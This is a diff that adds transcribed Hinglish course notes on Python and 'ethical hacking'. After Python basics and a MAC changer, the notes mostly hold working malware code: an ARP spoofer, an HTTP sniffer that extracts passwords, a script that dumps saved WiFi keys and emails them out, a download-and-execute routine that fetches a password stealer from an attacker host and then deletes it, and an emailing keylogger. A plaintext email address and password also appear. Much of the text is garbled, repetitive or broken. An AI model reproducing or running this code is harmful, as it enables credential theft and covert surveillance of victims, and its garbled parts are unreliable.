@@ -1,0 +1,2122 @@
+Page 1 * Learn Python & Ethical Hacking from Scratch * Introduction * Apni file
+ko .py extension ke saath save karein, jaise ki hello.py. * Ise terminal mein
+run karne ke liye type karein -> python hello.py. Iska matlab hai ki humne ise
+run karne ke liye Python 2 version use kiya hai. * Ise Python 3 ke saath run
+karne ke liye -> python3 hello.py. Yeh kehne ke liye ki hum ise Python 3 se run
+karna chahte hain. * Python IDE ke liye hum Pycharm editor use karenge. Page 2 *
+Working of Mac address changes. (MAC address kaise change hota hai) * What is
+MAC address & How to change it? (MAC address kya hai aur ise kaise badlein?) *
+MAC address ka matlab hai Media Access Control. * Yeh permanent, physical aur
+unique hota hai. * Yeh manufacturers dwara assign kiya jaata hai. * IP address
+internet par devices ko dhundne aur communicate karne ke liye use hota hai. *
+MAC address network ke andar devices ko dhundne aur communicate karne ke liye
+use hota hai. * MAC address 6-digit ka hota hai. (Note: Yeh 6 octets ya 12
+hexadecimal digits ka hota hai). * Network mein har packet mein source MAC aur
+destination MAC hota hai. Page 3 * Why change the Mac address? (MAC address kyon
+badlein?) * Network ke andar anonymity badhane ke liye. * Dusre devices ki nakal
+karne (impersonate) ke liye. * To change mac address manually in Kali terminal
+type: (Kali terminal mein manually MAC address badalne ke liye type karein:) *
+ifconfig eth0 down -> eth0 Interface ka naam hai. * ifconfig eth0 hw ether
+00:11:22:33:44:55 * ifconfig eth0 up * ifconfig eth0 -> Yeh check karne ke liye
+ki MAC address badla ya nahi. Page 4 * Using Python Modules & Executing System
+Commands. (Python Modules ka use karke System Commands execute karna.) *
+Subprocess module mein kai functions hote hain. * Yeh functions hamein system
+commands execute karne dete hain. * Commands us operating system par depend
+karte hain jis par script execute hoti hai. * Syntax: * import subprocess *
+subprocess.call("command", shell=True) * Save a file with name mac-changer.py
+(Ek file ko mac-changer.py naam se save karein) * import subprocess *
+subprocess.call("ifconfig", shell=True) * Note: Make sure to save this file. (Is
+file ko save karna zaroori hai.) * Ise terminal se python mac-changer.py likhkar
+run karein. Page 5 * Implementing a very Basic Mac Changer (Ek bahut Basic Mac
+Changer implement karna) * import subprocess * subprocess.call("ifconfig wlan0
+down", shell=True) * subprocess.call("ifconfig wlan0 hw ether
+00:11:22:33:44:66", shell=True) * subprocess.call("ifconfig wlan0 up",
+shell=True) Page 6 * Variables & Strings * Variable memory mein ek location hai
+jisme ek certain value hoti hai. * Maths ki tarah, yeh ek naam hai jo
+information store karne ke liye use hota hai. * Example: * x = 1 * y = x + 2 *
+Ab x ki value one hai, toh hum y = x + 2 kar sakte hain. * Aur y ki value 3 hai.
+Ab print(y) screen par y ki value print karega jo ki 3 hai. * Using Variable in
+MAC changer :- (MAC changer mein Variable ka istemal) * import subprocess *
+new_mac = "00:11:22:33:44:88" * print("changing Mac address for " + interface +
+" to " + new_mac) * subprocess.call("ifconfig " + interface + " down",
+shell=True) * subprocess.call("ifconfig " + interface + " hw ether " + new_mac,
+shell=True) * subprocess.call("ifconfig " + interface + " up", shell=True) Page
+8 * Getting Input from the user :- (User se Input lena) * Handling user Input *
+User se input lene ka sabse aasan tareeka keyboard ke through hai. * Ise haasil
+karne ke kai tareeke hain. * input() function user ko ek value enter karne ke
+liye prompt karta hai. * Example: * Age = input("What is your age?") * Yeh
+request karega: What is your age. * 'age' variable user input ki value ko hold
+karega. * Code: * import subprocess * interface = input("Interface > ") *
+new_mac = input("new Mac > ") * print("[+] changing Mac address for " +
+interface + " to " + new_mac) * subprocess.call("ifconfig " + interface + "
+down", shell=True) * subprocess.call("ifconfig " + interface + " hw ether " +
+new_mac, shell=True) * subprocess.call("ifconfig " + interface + " up",
+shell=True) * Note: Ise Python 3 ke saath run karein kyunki input() Python 3 ka
+function hai. Page 9 * Handling user Input * Program ke saath problem yeh hai ki
+user hamare program ke beech mein system command execute kar sakta hai. * Matlab
+-> Interface mein -> wlan0; ls * Ab, user ne wlan0 ke saath ls bhi de diya hai
+jo ki ek linux command hai, toh hamara python use bhi execute kar dega. Isliye
+yeh implement karne ka perfect tareeka nahi hai. * Best way is (Sabse accha
+tareeka hai): * subprocess.call(["command", "argument", ...]) * Ismein commands
+alag-alag hote hain, isliye, pehla part command hoga aur fir baki sabhi part
+command ke argument honge. * Example: * subprocess.call(["ls", "-l"]) Page 10 *
+Handling Command Line Arguments :- (Command Line Arguments ko Handle Karna) *
+Initializing variables Based on Command line Arguments. (Command line Arguments
+ke Aadhar par variables ko Initialise karna.) * import subprocess * import
+optparse * parser = optparse.OptionParser() * parser.add_option("-i",
+"--interface", dest="interface", help="Interface to change its mac") *
+parser.add_option("-m", "--mac", dest="new_mac", help="New mac address") *
+(options, arguments) = parser.parse_args() * Note: Kyunki yeh method do values
+return karta hai, isliye humne result ko do variables mein capture kiya hai. *
+interface = options.interface * new_mac = options.new_mac *
+subprocess.call(["ifconfig", interface, "down"]) * subprocess.call(["ifconfig",
+interface, "hw", "ether", new_mac]) * subprocess.call(["ifconfig", interface,
+"up"]) Page 11 * Functions (Functions) * Instructions ka set jo ek task poora
+karta hai. * Input le sakta hai, aur result return kar sakta hai. * Code ko saaf
+(cleaner), dobara istemal karne layak (reusable), aur abstract banata hai. *
+input() function user ko ek value enter karne ke liye prompt karta hai. *
+Example: Hum ek function is tarah define kar sakte hain: * def
+function_name(variable1, variable2, ... etc): * Aur use code mein is tarah call
+kar sakte hain: * function_name(value1, value2) * Syntax * if condition 1: * #
+Code to execute when condition 1 is true * if condition 2: * # Code to execute
+when condition 2 is true * -> Rest of Code Page 12 * Returning values from
+functions (Functions se values return karna) * Decision Making Theory i.e.
+Conditionals (Faisla lene ki theory yaani Conditionals) * Code ko tabhi execute
+karna jab ek condition sach (true) ho. * Syntax 1: * if condition: * # Code to
+be executed when condition is true * else: * # Code to be executed when
+condition is false * -> Rest of Code * Syntax 2: * if condition 1: * # Code to
+be executed when condition 1 is true * elif condition 2: * # Code to be executed
+when condition 2 is true and condition 1 is false * else: * # Code to execute
+when all conditions are false * -> Rest of Code Page 13 * Using Conditional
+Statement in Mac Changer (Mac Changer mein Conditional Statement ka istemal) *
+(Full code of macchanger) * import subprocess * import optparse * def
+get_arguments(): * parser = optparse.OptionParser() * parser.add_option("-i",
+"--interface", dest="interface", help="Interface to change its mac") *
+parser.add_option("-m", "--mac", dest="new_mac", help="new mac") * (options,
+arguments) = parser.parse_args() * if not options.interface: * parser.error("[-]
+please specify interface") * elif not options.new_mac: * parser.error("[-]
+please specify a new mac") * return options * def change_mac(interface,
+new_mac): * print("[+] Changing mac address for " + interface + " to " +
+new_mac) * subprocess.call(["ifconfig", interface, "down"]) * options =
+get_arguments() * change_mac(options.interface, options.new_mac) Page 14 * Mac
+Changer - Algorithm Design * What is Algorithm (Algorithm kya hai)? * Steps :- *
+ifconfig ko execute karein aur read karein. * Output se MAC address dhoondein. *
+Check karein ki MAC address user ke diye hue address jaisa hai ya nahi. * Sahi
+messages print karein. * Reading Output returned by System commands (System
+commands se return hue Output ko padhna) * Python mein
+subprocess.check_output(["...", "..."]). * Yeh command execute karta hai aur
+output return karta hai. * Note :- Subprocess ke 3 functions hote hain: *
+subprocess.check_output() -> Yeh command execute karta hai aur saara output ek
+variable mein return karta hai. * subprocess.Popen() -> Yeh command ek alag
+thread mein execute karta hai aur doosre code ko execute hone se nahi rokta. *
+subprocess.call() -> Yeh command execute karta hai aur uske khatm hone ka
+intezaar karta hai, tabhi doosra code execute hota hai. Page 15 * Regular
+expression - Regex * Ek string ke andar specific patterns search karna. *
+Patterns match karne ke liye rules ka istemal karta hai. * Yeh program ko batane
+ke liye bahut accha hai ki bade text mein kya dhoondhna hai. * Ek site hai
+www.pythex.org jisme aap theory se sab kuch dhoondh sakte hain. * pythex mein,
+aap jo characters search karna chahte hain, unhe search karne ke liye bahut se
+method honge. * For example: Agar aap search ki jagah \d likhte hain -> iska
+matlab hai ki yeh aapke text mein sabhi digits ko highlight kar dega. * For
+example: <.?> -> Iska matlab hai ki yeh har us cheez ko highlight karega jo < se
+shuru hoti hai aur > par khatm hoti hai, aur . * ka matlab hai koi bhi character
+ya zero ya usse zyada characters. * ifconfig ka result copy karein aur use
+pythex site par paste karein aur regex rule dein \w\w:\w\w:\w\w:\w\w:\w\w:\w\w.
+Toh yeh sirf ifconfig ke mac address ko highlight karega aur uske baad python se
+MAC address change karne ke baad hum naya mac address print karenge. Page 16 *
+Refactoring & Housekeeping using Regex (Regex ka istemal karke code ko sudharna
+aur saaf karna) * Implementing the Algorithm to check mac address (MAC address
+check karne ke liye Algorithm implement karna) * import subprocess * import
+optparse * import re * def get_arguments(): ... * def change_mac(interface,
+new_mac): ... * def get_current_mac(interface): * ifconfig_result =
+subprocess.check_output(["ifconfig", interface]) * mac_address_search_result =
+re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", ifconfig_result) * if
+mac_address_search_result: * return mac_address_search_result.group(0) * else: *
+print("[-] couldn't read mac address") * options = get_arguments() * current_mac
+= get_current_mac(options.interface) * change_mac(options.interface,
+options.new_mac) * current_mac = get_current_mac(options.interface) * if
+current_mac == options.new_mac: * print("[+] mac changed") * else: * print("[-]
+error try again") Page 17 * Programming a Network Scanner (Ek Network Scanner
+Program karna) * Network Scanners :- * Network par devices ko scan karte hain. *
+Unka IP address discover karte hain. * Unka MAC address display karte hain. *
+Hum python ke saath netdiscover jaisa ek tool banane ja rahe hain. * What is ARP
+& what is it used for? (ARP kya hai aur yeh kis liye istemal hota hai?) *
+Diagram explanation: Ek computer (jiska IP 10.0.2.15 hai) network par sabse
+poochta hai, "Who has 10.0.2.6?". Jis computer ke paas woh IP (10.0.2.6) hota
+hai, woh jawab deta hai, "I have 10.0.2.6, my MAC is 00:11:22:33:44:66". * ARP
+mein ek computer har client se poochta hai ki 10.0.2.6 kiske paas hai aur jis
+client ke paas woh IP hota hai, woh apne Mac address ke saath jawab deta hai.
+Page 18 * Designing an algorithm to discover clients connected to the Same
+network (Ek hi network se jude clients ko khojne ke liye ek algorithm design
+karna) * Python mein, Scapy module yeh sab kaam karega. * Network Scanner
+algorithm. * Goal -> Network par clients ko discover karna. * Steps -> * Ek ARP
+request banayein jo broadcast MAC ko direct ho aur IP pooche. * Packet bhejein
+aur response receive karein. * IP aur MAC dhoondhne ke liye response ko parse
+karein. * Result print karein. Page 19 * Lists * Values/elements ki list, jo ek
+hi variable mein store ki ja sakti hai. * Example :- * lucky_numbers_list = [3,
+7, 8, 17, 24] * Python ise is tarah samjhega: * Index: 0, 1, 2, 3, 4 * Value: 3,
+7, 8, 17, 24 * Elements ko is index ka use karke access kiya ja sakta hai. *
+print(lucky_numbers_list[0]) # 3 print karega. * print(lucky_numbers_list[1]) #
+7 print karega. * print(lucky_numbers_list[2]) # 8 print karega. * Peeche se
+aakhiri item access karne ke liye: * Index -1 ka use karein. Toh yeh aakhiri
+element dega. * print(lucky_numbers_list[-1]) # = 24. Page 20 *
+scan("10.0.2.1/24") * Code: * import scapy.all as scapy * def scan(ip): *
+arp_request = scapy.ARP(pdst=ip) * broadcast =
+scapy.Ether(dst="ff:ff:ff:ff:ff:ff") * arp_request_broadcast =
+broadcast/arp_request * answered_list = scapy.srp(arp_request_broadcast,
+timeout=1, verbose=False)[0] * Humne verbose ko False rakha kyunki hum koi aur
+packet receive ya kuch aur is tarah ka nahi dekhna chahte. * print("IP\t\t\t MAC
+address\n---------------------------------") * \t -> Tab space deta hai. * \n ->
+n ke baad sab kuch new line mein dikhata hai. * for element in answered_list: *
+print(element[1].psrc + "\t\t" + element[1].hwsrc) * scan("10.0.2.1/24") Page 21
+* Dictionaries * Lists ki tarah hi hote hain lekin Index ke bajaye Key ka
+istemal karte hain. * Example :- * target_client = {"mac": "00:11:22:33:44:55",
+"ip": "10.0.2.1", "os": "windows"} * Python isse is tarah interpret karega: *
+Key: mac | ip | os * Value: 00:11:22:33:44:55 | 10.0.2.1 | windows * Elements ko
+unki Key ka use karke access kiya ja sakta hai. * print(target_client["mac"]) #
+prints 00:11:22:33:44:55 * print(target_client["ip"]) # prints 10.0.2.1 *
+print(target_client["os"]) # prints windows Page 22 * Python 3 Compatibility *
+Note: * Python 3 mein scapy pehle se install nahi aata, isliye ise project mein
+laane ke liye command deni padti hai. * pip3 install scapy-python3 * Yeh python
+3 version ke liye scapy install karne ko kehta hai. * Agar aap pip install ka
+use karte hain toh yeh python 2.7 version install karega. * Theory yeh hai ->
+Python 3 mein Optparse deprecated (purana ho gaya) hai, Argparse naam ka naya
+module aaya hai. * Toh, argparse use karne ke liye, iska document padhein ya do:
+* import argparse * def get_arguments(): * parser = argparse.ArgumentParser() *
+parser.add_argument("-t", "--target", dest="target", help="Target IP / IP
+range") * options = parser.parse_args() * return options * Note: Sirf method ka
+naam badla hai, baaki sab kuch Same hai. Page 23 * Dynamic Printing * Python 3
+mein: * \r -> Job space dene ke liye. * \n -> New line dene ke liye. * Hum kuch
+bhi ek hi jagah par baar-baar print karna chahte hain. * Yeh poore terminal ko
+bharne ki bajaye, har baar print ki hui cheez ko usi jagah par overwrite kar
+dega. * import scapy.all as scapy * import time * def get_mac(ip):... * def
+spoof(target_ip, spoof_ip):... * sent_packets_count = 0 * while True: *
+spoof("10.0.2.7", "10.0.2.1") * spoof("10.0.2.1", "10.0.2.7") *
+sent_packets_count = sent_packets_count + 2 * print("\r[+] packets sent: " +
+str(sent_packets_count), end="") * time.sleep(2) * Iska matlab hai ki aap print
+statement ke ant mein kaun se characters add karna chahte hain, aur humne kaha
+ki hum ant mein koi character add nahi karna chahte. * Ab, saari print hone wali
+cheez dynamically ek hi jagah par print hogi, saare print ko overwrite karke.
+Page 24 * Handling Exception (Exceptions ko Handle karna) * Hamari script ke
+saath ek hi samasya hai jab user hamare program ko rokna chahta hai toh woh CRTL
++ C press karta hai aur hamara program ek message ke saath ruk jaata hai, pehle
+KeyboardInterrupt aur fir bahut saare python messages. * Handling Exceptions *
+try/except ka upyog errors ko handle karne ke liye kiya ja sakta hai. * try
+block mein default code likhein. * except block mein run karne ke liye code
+likhein agar try block mein errors aati hain. * Agar error aati hai toh
+exception block execute hota hai, warna try code execute hota hai. * Syntax :- *
+try: * # Request Code to run. * except [exception type]: * # Code to run when
+exception/error occurs. Page 25 * Analysing fields & extracting passwords
+(Fields ko analyse karna aur passwords nikalna) * Ek hi samasya hai ki kuch
+websites apne details ya data form fields ke zariye bhejti hain. * Toh, woh data
+bhi wahan print ho sakta hai, usse bachne ke liye, hum yeh karte hain. * import
+scapy.all as scapy * from scapy.layers import http * def sniff(interface): *
+scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) * def
+process_sniffed_packet(packet): * if packet.haslayer(http.HTTPRequest): * if
+packet.haslayer(scapy.Raw): * load = packet[scapy.Raw].load * keywords =
+["username", "user", "login", "password", "pass"] * for keyword in keywords: *
+if keyword in load: * print(load) * break -> Loop ko todne ke liye agar keyword
+mil jaata hai. * sniff("eth0") * Note :- Humne ek array (list) di hai jisme kuch
+keywords hain jaise username, password, etc. Is tarah yeh sirf zaroori data hi
+print karega. ### Page 26 of 160: #7 Capturing Passwords from Any Connected to
+the Same Network - **Final Code and Somewhat Refactoring** 1. Import scapy all
+as scapy 2. From scapy.layers import http 3. def sniff(interface): - interface =
+"enp0s3" *(face = interface, iface = enp0s3)* 4. def get_url(packet): - return
+packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path 5. def
+get_login_info(packet): - if packet.haslayer(scapy.Raw): - load =
+packet[scapy.Raw].load - keywords = ["username", "password", "user"] - for
+keyword in keywords: - if keyword in load: - return load - **This section
+similar to break in ARP** 6. def process_sniffed_packet(packet): - if
+packet.haslayer(http.HTTPRequest): - url = get_url(packet) - print(f"[+] HTTP
+Request >> {url}") - login_info = get_login_info(packet) - if login_info: -
+print(f"[+] Possible username/password {login_info}") ### Page 27 of 160: #12
+Writing Malware - Introduction of Features - **Introduction of Features** 1.
+Writing malware execute code 2. Download file execute code upload report 3.
+Download + execute execute and report - **Keyloggers:** - Program that record
+keys pressed on the keyboard - **Reverse Backdoors:** 1. Accessing file system
+2. Execute system commands 3. Download files 4. Upload files 5. Persistence -
+**Programming Trojans:** - **Note:** All these malware are cross-platform - i.e.
+Windows, OSX, Linux ### Page 28 of 160: #3 Execute System Command Payload -
+Execute system command payload - ie execute system command on target - a) If
+program is executed on Windows: execute Windows commands - b) If program is
+executed on Mac/Linux: as x- execute - After packaging - Execute any system
+command on any OS using a single file 1. Create a python file with simple
+execute_command.py 2. #!/usr/bin/python3 3. import subprocess 4. (command = "msg
+* you have been hacked") 5. subprocess.Popen(command, shell=True) - Inside
+subprocess.Popen is a method to execute system command continuously with out
+waiting for thread - its result means Popen run on different thread - If you
+open cmd and type msg* you have been hacked you will see a popup window - from
+cmd run it with -C:\python27\ *(from interpreter print command of python file
+path of python file)* ### Page 29 of 160: #33 Sending Report by E-mail - Import
+subprocess - Import smtplib → Smto is used to send email 1. def send_mail(email,
+password, message): - server = smtplib.SMTP("smtp.gmail.com", 587) - We will use
+google smtp server - Google smtps work on port 587 - server.starttls() -
+server.login(email, password) - server.sendmail(email, email, message) -
+server.quit() 2. command = "netstat -an | find 'ESTABLISHED'" 3. result =
+subprocess.check_output(command, shell=True) 4. Success. Check output execute
+system (command and return its output to result variable) 5.
+send_mail("satyamgupta@gmail.com", "143568", result) - My email; → this my
+password) content ### Page 30 of 160: Note on Using Regex to Filter Command
+Output - **Note:** You need to use regex on "Allow users" to get output -
+**Filtering Command Output Using Regex:** - To above the problem is, we said to
+get password of every wifi name in, forget cmd - Import subprocess, smtplib, re
+→ for regex used 1. def send_mail(email, password, message): ... 2. command =
+"netsh wlan show profile" 3. networks = subprocess.check_output(command,
+shell=True) 4. network_names = re.findall('"([^"]*)"', str(networks))
+*(netstat)* 5. print(network_names) - As is a regex you on go on -
+https://www.website and also you will get the same code to print all network
+names: ### Page 31 of 160: #5 Stealing WiFi Passwords Saved on a Computer -
+Import subprocess, smtplib, re 1. def send_mail(email, password, message): ...
+2. command = "netsh wlan show profile" 3. networks =
+subprocess.check_output(command, shell=True) 4. network_names =
+re.findall('"([^"]*)"', str(networks)) 5. current_result = "" 6. #+ we find made
+sent it usable as entry so that it will not overnight anything 7. for
+network_name in network_names: - command = f'netsh wlan show profile
+{network_name} key=clear' - (command) = "netsh wlan show profile" + network_name
++ "keys=clear" - (current_result = subprocess.check_output(command, shell=True)
+- result = result + current_result 8. send_mail("satyamgupta@gmail.com",
+"143568", result) ### Page 32 of 160: #8 Downloading Files from Program -
+Downloading file on system: included - Once package properly will work on all OS
+- Can be used for any modifications - Download file + execute(command) =
+download and execute - Download file execute and report =
+download-execute-and-report - etc. etc. 1. Import requests → request library
+used to send request on web 2. def download(url): - get_response =
+requests.get(url) - print(get_response) → # if will print <200> hites code -
+(try: except) of if response in the given url - print(get_response.content) → #
+it will print content in jebus for binary chemical: - split do text of between
+is because type of image: 3. download("http://10.0.2.16/evil-file/malware.exe")
+4. result = subprocess.check_output("dir", shell=True) ### Page 33 of 160:
+Writing Files on Disk 1. Import requests 2. def download(url): ... 3. def
+upload(): ... 4. file_name = url.split("/")[-1] *(# To say file name)* - #
+splitting file name can the base of it and use take last name as file name 5.
+print(file_name) → # optional to see file name 6. with open(file_name, "wb") as
+out_file: - out_file.write(get_response.content) - # means wb = means write in
+binary mode - Indentation is required so that all this code get executed when
+file is open 7. download("http://www.cosmagine.co.uk/images/TR-os.jpg") ### Page
+34 of 160: Password Recovery Binaries - **Download Execute And Report:** -
+Execute a command that uses this file - Report platform - Easily steal all saved
+passwords job - Ex: remotely steal all saved passwords - **Note:** Lagagne is a
+tool which give every browsers saved password and auto wifi saved password -
+From github download lagagne tool = done - **Note:** Someone Lagagne doesn't
+Give chrome os - browser saved password to for that shows - Browser saved
+password and password working ### Page 35 of 160: #9 Using All the Above to
+Steal Saved Passwords - **Using all the above to steal saved passwords** -
+**Just host baggage on your website:** - Import requests, subprocess, smtplib 1.
+def download(url): ... 2. def send_mail(email, password, message): ... 3.
+download("http://10.0.2.16/evil-file/lagagne.exe") 4. result =
+subprocess.check_output("lagagne all", shell=True) 5. To command strip time
+command to run lagagne to get password of everything. - ie, browser password,
+wifi password etc. 6. send_mail("satyamgupta@gmail.com", "143568", result) ###
+Page 36 of 160: #10 Fascinating with the File System - **The Problem:** -
+Working directory from where the backdoor will run that - It will less reflect
+from where python will do - So we will download backdoor of lagagne to - Temp
+directory where victim is in running execute will also delete it after it get -
+**Code Implementation:** 1. Import requests, subprocess, smtplib 2. def
+download(url): ... 3. def send_mail(email, password, message): ... 4.
+temp_directory = tempfile.gettempdir() *(# To get temp directory)* 5.
+os.chdir(temp_dir) *(# To change to temp directory)* 6.
+download("http://10.0.2.16/evil-file/lagagne.exe") 7. result =
+subprocess.check_output("lagagne all", shell=True) 8.
+send_mail("satyamgupta@gmail.com", "143568", result) 9. os.remove("lagagne.exe")
+*(# To remove lagagne after all with done)* ### Page 37 of 160: Note on Send
+Mail Function After 2022 - **Note:** In send mail function after 2022 may - You
+don't need to give your Gmail password because of security issue - Email
+password through which year to your gmail account - **So you need to create
+special app:** - That it will send that our your email - **To create special
+password:** 1. Login to your gmail account today 2. Go in Security section 3.
+Make sure that 2 step verification is on 4. Click on 'App passwords' - You need
+to again log in 5. In 'App password select' → Custom - Click on 'Generate' - It
+will give your new password - And by this password you can authenticate with
+your google account - Now always use this password and send something or you con
+### Page 38 of 160: #13 Writing Keyloggers - Introduction of Features -
+**Introduction of Features:** - Program that records keys pressed on the
+keyboard - For this we will learn Object Programming - Threading module ... etc.
+- **#2 Writing a Basic Local Keylogger:** - Keylogger: program that records keys
+pressed on the keyboard - **Common Features:** - Store logs locally (local
+keylogger) - Report logs to email or remote server (remote keylogger) - Log
+screenshots - Start with system startup ### Page 39 of 160: Pynput Install and
+Basic Keylogger Code - **pif3 install pynput** → # To install this module -
+**Save a python file with name Keyloggers.py:** 1. import pynput.keyboard 2. def
+process_key_press(key): - print(key) 3. keyboard_listener =
+pynput.keyboard.Listener(on_press=process_key_press) 4. with
+keyboard_listener.join() - whenever on press will happen process key press -
+function will be called. on press it a - call back function 5. with
+keyboard_listener: ... - From one terminal of kali run it python3 Keyloggers.py
+- In another terminal start typing something will see - all that in 1st terminal
+- **Note:** To stop this running keylogger - → after → kill all python → pid all
+python ### Page 40 of 160: Global Variable 1. import pynput.keyboard 2. log = ""
+3. def on_key_press(key): - # log="" → we can also define an empty string here -
+# but since at if inside function will be. All process_key_press function will
+be called - Variable as empty and will make log - So it is better to define
+outside 4. # Global log → # because log variable is defined outside this
+function which is process_key_press() so we will have - (to say access global
+variable) 5. log = log + str(key) - # To contest key as string so that we can
+concat it with another string called log 6. print(log) 7. keyboard_listener =
+pynput.keyboard.Listener(on_press=on_key_press) 8. with keyboard_listener.join()
+### Page 41 of 160: Threading + Recursion - **#55 Threading + Recursion:** -
+Report function run in the background - Don't interrupt program execution -
+Every x seconds send report - Great are of threading - Now the thing are done
+only we have to apply - method to send email of our key presses - **Eg:** 1.
+Import pynput.keyboard 2. log="" 3. def process_key_press(key): ... 4. def
+report(): # we can make a recursive function - while True: - sleep(60) -
+sendmail() 5. keyboard_listener =
+pynput.keyboard.Listener(on_press=process_key_press) 6. report() 7.
+keyboard_listener.join() - But report function will be in saftly - loop - #
+keyboard_listener.join() → # but report function will never be executed - #
+report() # → if we give function after keyboard listener - our report function
+will never be executed ### Page 41 of 160 (Continued): Logging Special Keys -
+**#40 Logging Special Keys:** - The only problem with our previous python code
+is that: - It always print ' after the character you type - So, to remove ' we
+will have to try catch 1. Import pynput.keyboard 2. log = "" 3. def
+process_key_press(key): - global log - try: - log=log + str(key.char) # # since
+if we said - # keyboard space get if we print - # it print space thus on space -
+except AttributeError: - if key == Key.space: - log = log + " " - else: - log =
+log + " [" + str(key) + "] " # (to print space : - between - them 4. print(log)
+5. keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press) 6.
+with keyboard_listener.join() ### Page 42 of 160: Report Function Implementation
+- **Great way of threading** - **Now we will execute report() function at end of
+program:** - in keyboard_listener.join() function at will be late - Because of
+the above problem we will include so that keyboard_listener.join() - report()
+will run in a separate thread and 1. Import pynput.keyboard 2. log = "" 3. def
+process_key_press(key): ... 4. def report(): - global log - print(log) - After
+printing empty so painted new data will - log = "" - timer = threading.Timer(5,
+report) - timer.start() 5. keyboard_listener =
+pynput.keyboard.Listener(on_press=process_key_press) 6. with keyboard_listener:
+- report() # before history report log will print all key -
+keyboard_listener.join() - times selection thread we are calling - report() → #
+before ) report log will empty - keyboard listener join () times function will
+on different thread it is waiting report - 5 second in that time user will type
+after 5 sec report function will print all text data ### Page 43 of 160: #4 We
+Need Report() Function at End of Program - #4 We need report() function at end
+of program - in keyboard_listener.join() function at will be late - Because of
+the above problem we will include so that keyboard_listener.join() - report()
+will run in a separate thread and - Import pynput.keyboard - Import threading #
+because of threading times will run on different thread and keyboard listener
+will run or 1. log = "" 2. def process_key_press(key): - # Get key press
+function from inside pynput 3. def report(): - global log - print(log) - After
+printing empty so painted new data will - log = "" - timer = threading.Timer(5,
+report) - timer.start() 4. keyboard_listener =
+pynput.keyboard.Listener(on_press=process_key_press) 5. with keyboard_listener:
+- report() # before history report log will print all key -
+keyboard_listener.join() - times selection thread we are calling - report() → #
+before ) report log will empty - keyboard listener join () times function will
+on different thread it is waiting report - 5 second in that time user will type
+after 5 sec report function will print all text data ### Page 44 of 160: OOP -
+Object Oriented Programming Basics - **OOP - Object Oriented Programming:** -
+Keylogger classes - Object Programming - **Way of modeling program
+(blueprint):** - Logically group functions and data - Makes code more readable -
+More reusable - Separate implementation from usage (encapsulation) - Easier to
+extend - **# Note:** Problem with our previous code reuse - Have defined global
+variable in all code get - Longer and longer. It will be hard to track - More
+global variables etc. and this will limit - **# Note:** Functions inside class
+vs called methods - **# Note:** Every method that we define inside object first
+argument - of that method will be self - **Note:** Every code must be inside
+method or function - **Note:** Every time if you need to call variable to method
+- define inside class you will have to use self.variable_name - or
+self.method_name of your ### Page 45 of 160: Class Keylogger 1. Import
+pynput.keyboard 2. Import threading # way to define class name - letters, so
+that name that after know they are being with class 3. log = "" 4. class
+Keylogger: 5. def process_key_press(self, key): - global log - try: log = log +
+str(key.char) - except: - if key == Key.space: log = log + " " - else: log = log
++ " [" + str(key) + "] " 6. def report(self): - global log - print(log) - log =
+"" - timer = threading.Timer(5, self.report) # called method we called - # # we
+called class be fore class - # inside self name 7. def start(self): -
+keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press) -
+with keyboard_listener: - self.report() - keyboard_listener.join() 8. k =
+Keylogger() 9. k.start() # self report() → # set NOR k join() - keyboard
+listener join() ### Page 46 of 160: OOP - Creating Objects from Classes -
+**Note:** We made the class but we didn't use it - Class means we make the well
+blueprint if we - use keylogger any object well have to - You can make the
+object at the end of every function - outside of class to call the class
+keyloggers - But that is not a good practice - **Better way to make a new file
+name Keylogger.py:** - # Inside that python (main) + = yes 1. Import Keyloggers
+# Keyloggers of the name of file where all - code of class keylogger is after 2.
+my_keyloggers = keyloggers.Keylogger() 3. my_keyloggers.start() - From terminal
+run it by python3 keylog.py - your keylogger will work - **Note:** Advantage of
+using OOP concept is that - In future if developers want to make some changes in
+- keyloggers class they will make change in keylogger.py - file and just code in
+keylog.py file execute - Import of keyloggers is already done ### Page 47 of
+160: Constructor Methods in OOP - **# Constructor Methods:** - Constructor: open
+import # from constructor we can - pass arguments to class - **# Constructor:
+init method:** - From constructor we can initialize class variables 1. def
+__init__(self, time_interval, email, password): - self.log = keyloggers started
+- self.email = email_interval - self.password = password - **Note:** Constructor
+takes place → def - **# Constructor: init method:** - def open import # from
+constructor we can - pass arguments to class - **Note:** Constructor takes place
+→ def - **# Constructor: init method:** - def open import # from constructor we
+can - pass arguments to class - **Note:** Constructor takes place → def - **#
+Constructor: init method:** - def open import # from constructor we can - pass
+arguments to class - **Note:** Constructor takes place → def ### Page 48 of 160:
+#5 Logging Key-Strikes and Reporting by E-mail - **#5 Logging key-strikes and
+reporting by e-mail** - **Note:** The problem with previous code is that - The
+interval variable in brain mail modified us - Given .. etc variable related
+problems are - **Open Keyloggers.py file:** 1. Import pynput.keyboard 2. Import
+smtplib 3. class Keyloggers: - def __init__(self, time_interval, email,
+password): - self.log = "Keyloggers started" - self.email = email -
+self.password = password - def append_to_log(self, string): ... - def
+process_key_press(self, key): ... - def report(self): -
+self.send_mail(self.email, self.password, "msg" + self.log) - self.log = "" -
+timer = threading.Timer(self.interval, self.report) - timer.start() - def
+send_mail(self, email, password, msg): - server = smtplib.SMTP("smtp.gmail.com",
+587) - server.starttls() - server.login(email, password) -
+server.sendmail(email, email, msg) - server.quit() ### Page 49 of 160:
+Constructor Initialization and Start Method - **def __init__(self,
+time_interval, email, password):** - self.interval = time_interval *(# first
+email)* - self.log = "Keyloggers started" - self.email = email - self.password =
+password - **def append_to_log(self, string):** - self.log = self.log + string -
+**def process_key_press(self, key):** - try: - self.append_to_log(str(key.char))
+- except AttributeError: - if key == Key.space: self.append_to_log(" ") - else:
+self.append_to_log(f"[{key}]") - **def report(self):** -
+self.send_mail(self.email, self.password, f"msg {self.log}") - self.log = "" -
+timer = threading.Timer(self.interval, self.report) - timer.start() - **def
+start(self):** - keyboard_listener =
+pynput.keyboard.Listener(on_press=self.process_key_press) - with
+keyboard_listener: - self.report() - keyboard_listener.join() ### Page 50 of
+160: Implementing Send Mail in Keylogger Class 1. def send_mail(self, email,
+password, msg): - server = smtplib.SMTP("smtp.gmail.com", 587) -
+server.starttls() - server.login(email, password) - server.sendmail(email,
+email, msg) - server.quit() - **Now open Keylogger.py file:** - #less\info
+python file 1. Import keyloggers 2. my_keyloggers = keyloggers.Keylogger(60,
